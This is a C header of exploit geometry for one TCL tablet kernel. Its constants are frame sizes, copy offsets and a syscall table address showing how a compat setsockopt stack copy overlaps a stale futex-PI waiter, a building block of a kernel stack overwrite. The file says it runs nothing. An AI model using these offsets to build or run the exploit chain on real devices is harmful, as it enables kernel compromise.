#ifndef TCL_V643_MCAST_GEOMETRY_H
#define TCL_V643_MCAST_GEOMETRY_H

/*
 * Exact host-side geometry for the IPv4 MCAST_BLOCK_SOURCE stack-copy path
 * in the stock TCL T653T01 V643 kernel (5.15.180-android14-11).
 *
 * Exact vmlinux-v643.elf disassembly:
 *   __arm64_sys_setsockopt  0x10
 *   __sys_setsockopt        0x80
 *   sock_common_setsockopt  0x40
 *   udp_setsockopt          0x10
 *   ip_setsockopt           0x290
 *
 * ip_setsockopt copies a native group_source_req to sp+0x18 (0x108 bytes).
 * For an AArch32 task it first copies compat_group_source_req to sp+0x120
 * (0x104 bytes), then converts that object into the native local object.
 * The V643 compat syscall table entry 294 points to
 * __arm64_sys_setsockopt.cfi_jt, so both paths have the same wrapper frame;
 * the task's TIF_32BIT flag selects the compat local inside ip_setsockopt.
 *
 * The stale futex-PI waiter begins at syscall entry SP-0x1d0.  Therefore:
 *   native: waiter is +0x188 from the copy start and is out of range;
 *   compat: waiter is +0x080 from the copy start and its full 0x58 bytes fit.
 *
 * These constants are for arithmetic validation only.  They do not arm or
 * execute the futex bug, the stack overwrite or the PI-chain consumer.
 */

#define TCL_V643_MCAST_WRAPPER_FRAME           0x010U
#define TCL_V643_MCAST_SYS_FRAME               0x080U
#define TCL_V643_MCAST_SOCK_COMMON_FRAME       0x040U
#define TCL_V643_MCAST_UDP_FRAME               0x010U
#define TCL_V643_MCAST_IP_FRAME                0x290U
#define TCL_V643_MCAST_FRAME_TOTAL             0x370U

#define TCL_V643_MCAST_NATIVE_LOCAL_OFF        0x018U
#define TCL_V643_MCAST_NATIVE_COPY_SIZE        0x108U
#define TCL_V643_MCAST_NATIVE_FROM_SYSCALL_SP  0x358U
#define TCL_V643_MCAST_NATIVE_WAITER_OFF       0x188U

#define TCL_V643_MCAST_COMPAT_LOCAL_OFF        0x120U
#define TCL_V643_MCAST_COMPAT_COPY_SIZE        0x104U
#define TCL_V643_MCAST_COMPAT_FROM_SYSCALL_SP  0x250U
#define TCL_V643_MCAST_COMPAT_WAITER_OFF       0x080U

#define TCL_V643_COMPAT_SETSOCKOPT_NR            294U
#define TCL_V643_COMPAT_SETSOCKOPT_TABLE_ENTRY \
  0xffffffc009459dc8ULL

#endif
